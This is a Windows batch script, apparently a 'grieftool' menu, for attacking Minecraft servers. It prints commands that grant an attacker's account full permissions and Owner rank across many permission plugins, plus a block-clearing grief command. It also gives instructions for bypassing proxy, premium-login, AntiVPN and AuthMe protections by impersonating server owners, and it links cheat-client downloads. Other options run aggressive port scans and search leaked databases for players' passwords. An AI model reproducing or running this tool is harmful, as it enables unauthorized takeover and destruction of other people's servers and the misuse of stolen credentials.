@echo off
:: Discord: jinx#6828 | Discord Server: https://discord.gg/kHNYBYVDRn | If you're gonna use any part of the code give me credit !
:mainmenu
title grieftool by  jinx#6828
cls
echo                                       JINX TOOL
echo *
echo 1.Domain Lookup
echo 2.Grief Commands
echo 3.Port Scanner
echo 4.Player Lookup
echo 5.IpGeoLookup
echo 6.Bypasses
echo 7.Bungee Create
echo 8.DB Searcher
echo 9.Server Lookup
echo *
set /p okay=Choose an option:
if %okay%==1 goto domainlookup
if %okay%==2 goto griefcmds
if %okay%==3 goto portscanner
if %okay%==4 goto playerlookup
if %okay%==5 goto ipgeolookup
if %okay%==6 goto bypasses
if %okay%==7 goto bungeecr
if %okay%==8 goto dbsearcher
if %okay%==9 goto serverlookup
cls

:domainlookup
cls
echo *
echo Enter the domain in (example youtube.com).
echo Type in 69 to go back to the menu.
echo *
set /p domain=Type the domain in:
cls
nslookup %domain%
if %domain%==69 goto mainmenu
set /p backtomm2=Type in 69 to go back to the menu:
if %backtomm2%==69 goto mainmenu

:griefcmds
cls
echo LuckPerms * (for lpb use lpb user etc..)
echo /lp user zaxteray permission set *
echo /lp user zaxteray parent set owner
echo ==============================================
echo PermissionsEx *
echo /pex user zaxteray add *
echo /pex user zaxteray group set Owner
echo ==============================================
echo GroupManager *
echo /manuaddp zaxteray *
echo /manuadd zaxteray Owner
echo ==============================================
echo zPermissions *
echo /permissions player zaxteray set *
echo /permissions player zaxteray setgroup Owner
echo ==============================================
echo Powerful Perms *
echo /pp zaxteray add *
echo /pp zaxteray setrank Owner
echo ==============================================
echo UltraPermissions *
echo /upc addpermission zaxteray *
echo /upc setgroup zaxteray Owner 
echo ==============================================
echo BungeePerms *
echo /bp user zaxteray addgroup Owner
echo /bp user zaxteray addperm *
echo =============================================
echo Commandblock Command
echo /minecraft:execute zaxteray ~ ~ ~ minecraft:op zaxteray
echo ==============================================
echo WorldEdit Grief Command
echo /minecraft:fill ~-10 ~-10 ~-10 ~10 ~10 ~10 air
echo ==============================================
set /p backtomm=Type in 69 to go back to the menu:
if %backtomm%==69 goto mainmenu

:portscanner
cls
echo *
echo 1.Qubo Scan ( For smaller port ranges )
echo 2.Nmap Scan ( For bigger port ranges )
echo 3.Main Menu
echo *
set /p choosemode=Enter your option:
if %choosemode%==1 goto quboscan
if %choosemode%==2 goto nmapscan
if %choosemode%==3 goto mainmenu
cls

:quboscan
cls
echo *
set /p IP=Enter your IP:
set /p PORTS=Enter your ports:
echo *
java -jar -Dfile.encoding=UTF-8 qubo.jar -ports %PORTS% -th 500 -ti 1000 -range %IP%
echo *
echo 1.Scan another IP
echo 2.Go back to the main menu
echo *
set /P backtomm3=Select your option:
if %backtomm3%==55 goto quboscan
if %backtomm3%==69 goto mainmenu

:nmapscan
cls
echo *
set /p IP1=Enter your IP:
set /P PORTS1=Enter your ports:
echo *
nmap -p %PORTS1% -T5 -v -A -Pn %IP1%
echo *
echo 1.Scan another IP
echo 2.Go back to the main menu
echo *
set /P backtommns=Select your option:
if %backtommns%==1 goto nmapscan
if %backtommns%==2 goto mainmenu

:serverlookup
cls
echo *
echo This is the server lookup.
echo Example of IP - hypixel.net or 127.0.0.1.
echo *
set /P serverlookup=Enter the IP:
cls
echo *
curl -s https://mcstatus.snowdev.com.br/api/query/v3/%serverlookup%
echo *
echo 1.Lookup another server
echo 2.Go back to the main menu
echo *
set /p backtomm14=Select your option:
if %backtomm14%==1 goto serverlookup
if %backtomm14%==2 goto mainmenu
:playerlookup
cls
echo *
echo This is the player lookup.
echo Example of Nick - IceRush.
echo *
set /p playerlookup=Enter the Nick:
cls
echo *
curl -s https://api.mojang.com/users/profiles/minecraft/%playerlookup%
echo }
echo *
set /p backtomm4=Type in 69 to go back to the menu:
if %backtomm4%==69 goto mainmenu

:bypasses
cls
echo *
echo 1.OnlyProxyJoin Bypass
echo 2.Premium Server Bypass
echo 3.AntiVPN Bypass
echo 4.Authme Bypass
echo 5.Any Protection Plugin Bypass
echo *
set /p bypasses=Enter a number:
if %bypasses%==1 goto opjbypass
if %bypasses%==2 goto premsrwbypass
if %bypasses%==3 goto antivpnbypass
if %bypasses%==4 goto authmebypass
if %bypasses%==5 goto appbypass
if %bypasses%==69 goto mainmenu

:opjbypass
cls
echo *
echo Use Dymeth Client or other (you can type in 55 to see the list of clients you can use)
echo Enter the owner's nick and for your fake ip simply type in 1.1.1.1, 0.0.0.0 or 127.0.0.1
echo Or create a local bungee server with the ip 127.0.0.3 and port 25565 or 25566 and connect.
echo *
set /p backtomm5=Type in 69 to go back to the menu:
if %backtomm5%==69 goto bypasses
if %backtomm5%==55 goto opjclients

:opjclients
cls
echo *
echo Clients that you can use:Dymeth Client, Skill Client, Parrot Client, Jessica Client...
echo *
echo To download any of these, simply type their number in (example Dymeth is 1, Skill is 2 etc.)
echo *
:backtoclnumb
set /p cldl=Enter the client number or 69 to go back to the menu:
if %cldl%==2 start https://www.mediafire.com/file/asci91jnst782ls/SkillClient1.8-b8.1.zip/file
if %cldl%==1 start http://www.mediafire.com/file/k3cm6m3dv13ez8u/%255BCheatMine%255D_Dymeth_Client_2.0.rar/file
if %cldl%==3 start https://uloz.to/file/WWSN0Q4q85Wt/parrot-rar
if %cldl%==4 start http://www.mediafire.com/file/28b09c4ooukq20g/Jessica_1.8_.rar/file
if %cldl%==69 goto opjbypass
goto backtoclnumb

:premsrwbypass
cls
echo *
echo Create a offline bungeecord server with the ip of the server and with the right port.
echo Then use Dymeth or any other client, enter the name of the premium and uncheck the premium UUID option.
echo Simply join and it will work. To perform this again, restart your pc and go for it.
echo *
set /p backtomm6=Type in 69 to go back to the menu:
if %backtomm6%==69 goto bypasses

:antivpnbypass
cls
echo *
echo Create a local bungeecord server with the ip of the server or 127.0.0.1.
echo Simply connect to the server and you should bypass it.
echo Note that this doesn't always work because it depends on the plugin/configuration.
echo *
set /p backtomm7=Type in 69 to go back to the menu:
if %backtomm7%==69 goto bypasses

:authmebypass
cls
echo *
echo Join with the owners nick (or any operator nick) and try these commands:
echo /send, /server, /lobby, /lpb, /bp, /plugman, etc - if it works join and grief.
echo *
set /p backtomm8=Type in 69 to go back to the menu:
if %backtomm8%==69 goto bypasses

:appbypass
cls
echo *
echo This is actually very simple, most of the servers use some sort of a plugin management plugin.
echo Such as: PlugMan, PluginManager etc. Simply try the commands: /plugman or /pm.
echo *
set /p backtomm9=Type in 69 to go back to the menu.
if %backtomm9%==69 goto bypasses

:bungeecr
cls
cd bungee
start cmd /k java -jar WaterFall.jar
echo *
echo The server is up, access it by using the ip 0.0.0.0:33330.
echo It is a local bungee, to change the port or ip change it in the config.yml.(credits to wrrulos)
echo *
set /p backtomm10=Type in 69 to go back to the menu:
if %backtomm10%==69 goto mainmenu
if %backtomm10%==25 taskkill /f /im cmd.exe && cls && echo The server has now turned off.
set /p backtomm11=Type in 69 to go back to the menu:
if %backtomm11%==69 goto mainmenu

:dbsearcher
cls
echo *
set /p nickname=Enter the nick:
if %nickname%==69 goto mainmenu
cd dbsearcher
find /I "%nickname%" database1.txt > found_password.txt
find /I "%nickname%" database2.txt > found_password.txt
find /I "%nickname%" database3.txt > found_password.txt
echo *
cls
type found_password.txt
echo *
cd ../
echo 1.Search for another nick
echo 2.Go back to the main menu
echo *
set /P backtommoe=Select your option:
if %backtommoe%==1 goto dbsearcher
if %backtommoe%==2 goto mainmenu

:ipgeolookup
cls
echo *
set /p ipfl=Enter the IP:
if %ipfl%==69 goto mainmenu
cls
echo *
curl -s https://ipinfo.io/%ipfl%
echo *
echo 1.Lookup another IP
echo 2.Go back to the main menu
echo *
set /p backtomm15=Select your option:
if %backtomm15%==1 goto ipgeolookup
if %backtomm15%==2 goto mainmenu